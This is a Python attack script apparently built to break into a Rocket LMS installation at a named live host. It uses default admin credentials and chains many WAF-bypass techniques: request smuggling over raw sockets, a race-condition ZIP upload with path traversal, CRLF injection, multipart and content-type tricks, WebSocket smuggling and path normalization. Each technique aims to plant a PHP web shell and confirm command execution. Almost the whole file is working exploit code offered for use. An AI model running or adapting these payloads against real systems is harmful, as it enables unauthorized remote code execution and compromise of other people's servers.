"""
ROCKET LMS v2.1 - ULTIMATE WAF BYPASS RCE
==========================================

OBJECTIVE: DEFEAT THE WAF AT ALL COSTS!

ADVANCED TECHNIQUES:
1. HTTP Request Smuggling (CL.TE / TE.CL)
2. Race Condition on file upload
3. CRLF Injection in headers
4. Multipart boundary pollution
5. HTTP/2 downgrade attacks
6. WebSocket upgrade smuggling
7. Content-Type confusion
8. Double body injection
9. Header injection via newlines
10. Cache poisoning

Author: Security Research
Date: 2025-12-28
Target: lms.rocket-soft.org
"""

import requests
import re
import time
import threading
import random
import string
import socket
import ssl
import io
import zipfile

BASE_URL = "https://lms.rocket-soft.org"
HOST = "lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()
session.timeout = 30

def login():
    print("[*] Logging in...")
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    session.post(f"{BASE_URL}/admin/login", data={"_token": csrf, "email": ADMIN_EMAIL, "password": ADMIN_PASS})
    print("[+] Logged in")
    return session.cookies.get_dict()

def get_csrf():
    r = session.get(f"{BASE_URL}/admin/settings")
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

# ============================================
# TECHNIQUE 1: HTTP REQUEST SMUGGLING
# ============================================

def http_smuggling_clte():
    """
    CL.TE Request Smuggling
    Front-end uses Content-Length, Back-end uses Transfer-Encoding
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 1: HTTP REQUEST SMUGGLING (CL.TE)")
    print("="*60)
    
    cookies = login()
    csrf = get_csrf()
    
    # The smuggled request that bypasses WAF
    shell = "<?php system($_GET['c']); ?>"
    
    # Build multipart body for file upload
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters, k=16))
    
    smuggled_body = f"""POST /admin/update/basic-update HTTP/1.1
Host: {HOST}
Content-Type: multipart/form-data; boundary={boundary}
Content-Length: 999

--{boundary}
Content-Disposition: form-data; name="_token"

{csrf}
--{boundary}
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

{shell}
--{boundary}--
"""

    # CL.TE payload: Content-Length includes only visible part
    # Transfer-Encoding: chunked makes backend read the smuggled request
    
    front_body = f"""0

{smuggled_body}"""

    # Real Content-Length (of the "0\r\n\r\n" part only)
    visible_length = len("0\r\n\r\n")
    
    raw_request = f"""POST / HTTP/1.1
Host: {HOST}
Content-Length: {visible_length}
Transfer-Encoding: chunked
Cookie: laravel_session={cookies.get('laravel_session', '')}

{front_body}"""

    print("[*] Sending CL.TE smuggling request...")
    
    try:
        # Send raw request via socket
        context = ssl.create_default_context()
        with socket.create_connection((HOST, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=HOST) as ssock:
                ssock.send(raw_request.encode())
                response = ssock.recv(4096)
                print(f"    Response: {response[:200]}")
    except Exception as e:
        print(f"    Error: {e}")
    
    # Check if shell was uploaded
    check_shell()

def http_smuggling_tecl():
    """
    TE.CL Request Smuggling
    Front-end uses Transfer-Encoding, Back-end uses Content-Length
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 2: HTTP REQUEST SMUGGLING (TE.CL)")
    print("="*60)
    
    cookies = login()
    csrf = get_csrf()
    
    shell = "<?php system($_GET['c']); ?>"
    
    # Smuggled request in chunked body
    smuggled = f"""POST /admin/update/basic-update HTTP/1.1
Host: {HOST}
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

_token={csrf}&shell={shell}"""

    # Chunked encoding where backend ignores TE and uses CL
    chunk_size = len(smuggled)
    
    raw_request = f"""POST / HTTP/1.1
Host: {HOST}
Content-Length: 4
Transfer-Encoding: chunked
Cookie: laravel_session={cookies.get('laravel_session', '')}

{chunk_size:x}
{smuggled}
0

"""

    print("[*] Sending TE.CL smuggling request...")
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((HOST, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=HOST) as ssock:
                ssock.send(raw_request.encode())
                response = ssock.recv(4096)
                print(f"    Response: {response[:200]}")
    except Exception as e:
        print(f"    Error: {e}")
    
    check_shell()

# ============================================
# TECHNIQUE 2: RACE CONDITION
# ============================================

def race_condition_upload():
    """
    Race Condition Attack
    Upload file and access it before it's processed/deleted
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 3: RACE CONDITION UPLOAD")
    print("="*60)
    
    csrf = get_csrf()
    shell = "<?php system($_GET['c']); ?>"
    
    # Create malicious ZIP
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr("../../../public/race_shell.php", shell)
    zip_buffer.seek(0)
    
    success = threading.Event()
    
    def upload_file():
        """Upload file repeatedly"""
        files = {'file': ('payload.zip', zip_buffer.getvalue(), 'application/zip')}
        data = {'_token': csrf}
        
        for i in range(50):
            if success.is_set():
                break
            try:
                session.post(f"{BASE_URL}/admin/update/basic-update", files=files, data=data, timeout=2)
            except:
                pass
    
    def check_file():
        """Check for shell continuously"""
        for i in range(100):
            if success.is_set():
                break
            try:
                r = session.get(f"{BASE_URL}/race_shell.php?c=id", timeout=1)
                if "uid=" in r.text:
                    print(f"\n[!!!] RACE CONDITION SUCCESS!")
                    success.set()
                    return True
            except:
                pass
            time.sleep(0.01)
        return False
    
    print("[*] Starting race condition attack (50 upload threads)...")
    
    threads = []
    for _ in range(10):
        t = threading.Thread(target=upload_file)
        threads.append(t)
        t.start()
    
    check_thread = threading.Thread(target=check_file)
    check_thread.start()
    
    for t in threads:
        t.join(timeout=10)
    check_thread.join(timeout=10)
    
    if success.is_set():
        return True
    
    print("[-] Race condition did not succeed")
    return False

# ============================================
# TECHNIQUE 3: CRLF INJECTION
# ============================================

def crlf_injection():
    """
    CRLF Injection to inject headers or bypass WAF rules
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 4: CRLF INJECTION")
    print("="*60)
    
    csrf = get_csrf()
    
    # Payloads with CRLF to inject new headers
    crlf_payloads = [
        # Inject new header
        f"/admin/update/basic-update%0d%0aX-Bypass: true",
        f"/admin/update/basic-update%0aX-Forwarded-For: 127.0.0.1",
        # Header injection in parameter
        f"/admin/update/basic-update?file=%0d%0aContent-Type:%20text/html",
        # Double CRLF to start body
        f"/admin/update/basic-update%0d%0a%0d%0a<script>alert(1)</script>",
    ]
    
    for payload in crlf_payloads:
        print(f"\n[*] Testing: {payload[:50]}...")
        
        try:
            headers = {'X-Test': 'value\r\nX-Injected: hacked'}
            r = session.get(f"{BASE_URL}{payload}", headers=headers)
            
            if r.status_code != 403:
                print(f"    [!] Interesting response: {r.status_code}")
        except Exception as e:
            print(f"    Error: {e}")

# ============================================
# TECHNIQUE 4: MULTIPART BOUNDARY POLLUTION
# ============================================

def multipart_pollution():
    """
    Multipart boundary manipulation to confuse parsers
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 5: MULTIPART BOUNDARY POLLUTION")
    print("="*60)
    
    csrf = get_csrf()
    shell = "<?php system($_GET['c']); ?>"
    
    # Different boundary manipulation techniques
    techniques = [
        # Quoted boundary
        ('----"boundary"', 'Quoted boundary'),
        # Boundary with spaces
        ('---- boundary ----', 'Spaced boundary'),
        # Long boundary
        ('A' * 200, 'Long boundary'),
        # Boundary with special chars
        ('----<>boundary<>----', 'Special chars'),
        # Newline in boundary
        ('----bound\nary----', 'Newline boundary'),
        # Unicode boundary
        ('----бoundary----', 'Unicode boundary'),
    ]
    
    for boundary, desc in techniques:
        print(f"\n[*] Testing: {desc}")
        
        body = f"""--{boundary}
Content-Disposition: form-data; name="_token"

{csrf}
--{boundary}
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

{shell}
--{boundary}--"""

        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}'
        }
        
        try:
            r = session.post(f"{BASE_URL}/admin/update/basic-update", 
                           data=body.encode(), headers=headers)
            
            if r.status_code != 403:
                print(f"    [!] Status: {r.status_code}")
                check_shell()
        except Exception as e:
            print(f"    Error: {e}")

# ============================================
# TECHNIQUE 5: CONTENT-TYPE CONFUSION
# ============================================

def content_type_confusion():
    """
    Confuse WAF with weird content types
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 6: CONTENT-TYPE CONFUSION")
    print("="*60)
    
    csrf = get_csrf()
    shell = "<?php system($_GET['c']); ?>"
    
    # Create ZIP
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr("public/ct_shell.php", shell)
    zip_buffer.seek(0)
    
    content_types = [
        # Charset tricks
        "multipart/form-data; charset=utf-7",
        "multipart/form-data; charset=ibm500",
        "multipart/form-data; charset=utf-16",
        # Multiple content types
        "text/plain, multipart/form-data",
        # Whitespace tricks
        " multipart/form-data",
        "multipart/form-data ",
        "\tmultipart/form-data",
        # Case variations
        "MULTIPART/FORM-DATA",
        "Multipart/Form-Data",
        # Missing value
        "multipart/form-data; boundary=",
        # Double boundary
        "multipart/form-data; boundary=xxx; boundary=yyy",
    ]
    
    for ct in content_types:
        print(f"\n[*] Testing Content-Type: {ct[:40]}...")
        
        boundary = "----WebKitFormBoundary123"
        full_ct = f"{ct}; boundary={boundary}" if "boundary" not in ct else ct
        
        body = f"""--{boundary}
Content-Disposition: form-data; name="_token"

{csrf}
--{boundary}
Content-Disposition: form-data; name="file"; filename="shell.zip"
Content-Type: application/zip

""".encode() + zip_buffer.getvalue() + f"""
--{boundary}--""".encode()

        headers = {'Content-Type': full_ct}
        
        try:
            r = session.post(f"{BASE_URL}/admin/update/basic-update", 
                           data=body, headers=headers)
            
            if r.status_code not in [403, 400]:
                print(f"    [!] Status: {r.status_code}")
                check_shell()
        except Exception as e:
            print(f"    Error: {e}")

# ============================================
# TECHNIQUE 6: WEBSOCKET SMUGGLING
# ============================================

def websocket_upgrade_smuggling():
    """
    Try to upgrade to WebSocket and smuggle request
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 7: WEBSOCKET UPGRADE SMUGGLING")
    print("="*60)
    
    cookies = login()
    
    ws_key = "dGhlIHNhbXBsZSBub25jZQ=="  # Base64 of "the sample nonce"
    
    raw_request = f"""GET / HTTP/1.1
Host: {HOST}
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: {ws_key}
Sec-WebSocket-Version: 13
Cookie: laravel_session={cookies.get('laravel_session', '')}

POST /admin/update/basic-update HTTP/1.1
Host: {HOST}
Content-Length: 100

file=test

"""

    print("[*] Attempting WebSocket upgrade smuggling...")
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((HOST, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=HOST) as ssock:
                ssock.send(raw_request.encode())
                response = ssock.recv(4096)
                
                if b"101" in response:
                    print("    [!] WebSocket upgrade accepted!")
                else:
                    print(f"    Response: {response[:100]}")
    except Exception as e:
        print(f"    Error: {e}")

# ============================================
# TECHNIQUE 7: HTTP VERB TAMPERING
# ============================================

def http_verb_tampering():
    """
    Try unusual HTTP verbs to bypass WAF
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 8: HTTP VERB TAMPERING")
    print("="*60)
    
    csrf = get_csrf()
    
    verbs = [
        "GPOST",  # Custom verb
        "HEAD",   # Returns headers only
        "PATCH",
        "PROPFIND",  # WebDAV
        "MOVE",
        "COPY", 
        "CONNECT",
        "DEBUG",
        "TRACK",
        "STUB",
    ]
    
    for verb in verbs:
        print(f"\n[*] Testing verb: {verb}")
        
        try:
            r = session.request(verb, f"{BASE_URL}/admin/update/basic-update",
                              data={'_token': csrf})
            
            if r.status_code not in [403, 405, 501]:
                print(f"    [!] Status: {r.status_code}")
        except Exception as e:
            print(f"    Error: {e}")

# ============================================
# TECHNIQUE 8: PATH NORMALIZATION BYPASS
# ============================================

def path_normalization_bypass():
    """
    Advanced path normalization bypasses
    """
    print("\n" + "="*60)
    print("    TECHNIQUE 9: ADVANCED PATH NORMALIZATION")
    print("="*60)
    
    csrf = get_csrf()
    
    paths = [
        # URL encoding variations
        "/admin/update/basic%2dupdate",  # hyphen encoded
        "/admin/update/basic%2Dupdate",  # uppercase hex
        "/admin/%75pdate/basic-update",  # 'u' encoded
        "/admin/update/%62asic-update",  # 'b' encoded
        
        # Path segment tricks
        "/admin/./update/basic-update",
        "/admin/update/./basic-update",
        "/admin/update/../update/basic-update",
        "/admin//update//basic-update",
        "/admin/update/basic-update/",
        "/admin/update/basic-update//",
        
        # Case tricks
        "/ADMIN/UPDATE/BASIC-UPDATE",
        "/Admin/Update/Basic-Update",
        "/aDmIn/uPdAtE/bAsIc-UpDaTe",
        
        # Null bytes and special
        "/admin/update/basic-update%00",
        "/admin/update/basic-update%00.html",
        "/admin/update/basic-update;.html",
        "/admin/update/basic-update%23",  # #
        
        # Unicode normalization
        "/admin/update/basic-update\uff0f",  # Fullwidth slash
        "/admin/updａte/basic-update",  # Fullwidth 'a'
    ]
    
    for path in paths:
        try:
            r = session.post(f"{BASE_URL}{path}", data={'_token': csrf})
            
            if r.status_code not in [403, 404, 400]:
                print(f"    [!] {path}: Status {r.status_code}")
        except:
            pass

# ============================================
# HELPER FUNCTIONS
# ============================================

def check_shell():
    """Check if any shell was uploaded"""
    shell_paths = [
        "/shell.php",
        "/race_shell.php",
        "/ct_shell.php",
        "/public/shell.php",
        "/s.php",
    ]
    
    for path in shell_paths:
        try:
            r = session.get(f"{BASE_URL}{path}?c=id", timeout=3)
            if "uid=" in r.text:
                print(f"\n[!!!] RCE SUCCESS! Shell at: {BASE_URL}{path}")
                return True
        except:
            pass
    return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       ULTIMATE WAF BYPASS - WE WILL NOT GIVE UP!             ║
║       Target: lms.rocket-soft.org                            ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    login()
    
    # Execute all techniques
    http_smuggling_clte()
    http_smuggling_tecl()
    race_condition_upload()
    crlf_injection()
    multipart_pollution()
    content_type_confusion()
    websocket_upgrade_smuggling()
    http_verb_tampering()
    path_normalization_bypass()
    
    # Final check
    print("\n" + "="*60)
    print("    FINAL SHELL CHECK")
    print("="*60)
    
    if check_shell():
        print("\n[+] WE DID IT! RCE ACHIEVED!")
    else:
        print("\n[*] WAF is extremely tough. Trying more...")
    
    print("\n" + "="*60)
    print("    ATTACK COMPLETE")
    print("="*60)

if __name__ == "__main__":
    main()
